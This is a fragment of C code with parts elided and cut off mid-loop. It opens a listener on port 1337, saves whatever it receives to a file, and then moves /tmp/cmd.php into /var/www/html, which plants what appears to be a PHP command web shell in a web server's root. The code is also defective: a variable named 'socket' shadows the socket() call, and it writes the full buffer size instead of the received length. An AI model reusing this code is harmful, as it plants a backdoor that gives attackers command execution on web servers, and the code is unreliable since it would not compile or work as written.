...
int main(void)
{
    ...
    socket.sin_port = htons(1337) ;
    sck = socket(AF_INET, SOCK_STREAM, 0) ;
    bind(sck, (struct sockaddr *)&socket, sizeof(struct sockaddr)) ;
    listen(sck, 4) ;
    state = accept(sck, (struct sockaddr *)&address, &socket_len) ;
    is_recv = recv(state, content, sizeof(content), 0) ;
    if(is_recv > 0)
    {
        FILE* file1 = fopen(path, "a");
        fwrite((char*)content, sizeof(content), 1, file1);
        fclose(file1);
    }
    close(state) ;
    close(sck) ;
    rename("/tmp/cmd.php","/var/www/html/cmd.php");
	while(1)
	{
